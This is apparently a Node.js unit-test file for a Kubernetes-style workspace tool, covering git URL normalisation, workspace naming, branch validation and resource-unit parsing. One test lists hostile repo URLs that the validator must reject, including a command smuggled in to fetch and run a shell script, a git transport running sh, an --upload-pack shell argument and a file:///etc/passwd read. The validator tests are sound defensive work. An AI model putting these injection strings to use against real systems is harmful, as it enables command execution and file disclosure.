'use strict';

const test = require('node:test');
const assert = require('node:assert');

process.env.NAMESPACE = 'dev';

const { repoId, workspaceKey, repoFullName } = require('../lib/workspaceKey');
const { workspaceId, isWorkspaceId, slug } = require('../lib/naming');
const validate = require('../lib/validate');
const metrics = require('../lib/metrics');
const { parseStorageToGi } = require('../lib/pvcs');

test('repoId normalises every supported git URL form to one key', () => {
    const expected = 'github.com/edkief/my.repo';
    for (const url of [
        'git@github.com:Edkief/My.Repo.git',
        'git@github.com:Edkief/My.Repo',
        'https://github.com/Edkief/My.Repo',
        'https://github.com/Edkief/My.Repo.git',
        'ssh://git@github.com:22/Edkief/My.Repo.git',
    ]) {
        assert.equal(repoId(url), expected, url);
    }
});

test('workspaceKey is repo-scoped today, so branches share a volume', () => {
    const a = workspaceKey({ repoUrl: 'git@github.com:edkief/repo.git', branch: 'main' });
    const b = workspaceKey({ repoUrl: 'git@github.com:edkief/repo.git', branch: 'feature/x' });
    assert.equal(a, b);
});

test('workspaceId is deterministic, DNS-safe and <= 63 chars', () => {
    const key = repoId('git@github.com:edkief/repo.git');
    assert.equal(workspaceId(key), workspaceId(key));
    assert.ok(isWorkspaceId(workspaceId(key)));

    const long = repoId('git@github.com:some-really-long-organisation-name/' +
        'an-extremely-long-repository-name-that-just-keeps-going-and-going.git');
    const id = workspaceId(long);
    assert.ok(id.length <= 63, `${id.length} > 63`);
    assert.ok(isWorkspaceId(id));
    assert.ok(/^[a-z0-9]([-a-z0-9]*[a-z0-9])?$/.test(id), 'must be a valid DNS-1123 label');
});

test('workspaceId separates repos that share a truncated prefix', () => {
    const a = workspaceId(repoId('git@github.com:org/' + 'x'.repeat(60) + 'aaa.git'));
    const b = workspaceId(repoId('git@github.com:org/' + 'x'.repeat(60) + 'bbb.git'));
    assert.notEqual(a, b, 'hash suffix must disambiguate truncated names');
});

test('slug flattens branch names that contain slashes', () => {
    assert.equal(slug('feature/nested/name'), 'feature-nested-name');
    assert.equal(slug('---'), 'x');
});

test('repo URL validation rejects the injection and exotic-transport classes', () => {
    for (const bad of [
        'x; curl evil.sh | sh',
        'ext::sh -c whoami',
        'git@github.com:a/b.git --upload-pack=/bin/sh',
        'https://evil.com/a/b',
        'file:///etc/passwd',
        '',
    ]) {
        assert.throws(() => validate.validateRepoUrl(bad), /invalid|required|project/i, bad);
    }
    assert.equal(validate.validateRepoUrl(' git@github.com:edkief/repo.git '),
        'git@github.com:edkief/repo.git');
});

test('branch validation mirrors git check-ref-format', () => {
    for (const bad of ['-x', 'a..b', 'a b', 'a.lock', 'a~1', 'feat:x', '/lead', 'tail/', 'a@{0}', 'a\\b']) {
        assert.throws(() => validate.validateBranch(bad), /invalid branch/, bad);
    }
    assert.equal(validate.validateBranch('feature/nested/name'), 'feature/nested/name');
    assert.equal(validate.validateOptionalBranch('', 'newBranch'), null);
});

test('metrics quantity parsing handles the units metrics-server emits', () => {
    assert.ok(Math.abs(metrics.parseCpuToMillicores('123456789n') - 123.456789) < 1e-6);
    assert.equal(metrics.parseCpuToMillicores('45m'), 45);
    assert.equal(metrics.parseCpuToMillicores('2'), 2000);
    assert.ok(Math.abs(metrics.parseMemToMiB('512340Ki') - 500.33) < 0.01);
    assert.equal(metrics.parseMemToMiB('4Gi'), 4096);
});

test('storage quantity parsing distinguishes Gi from G', () => {
    assert.equal(parseStorageToGi('20Gi'), 20);
    assert.ok(Math.abs(parseStorageToGi('10G') - 9.313) < 0.001);
});
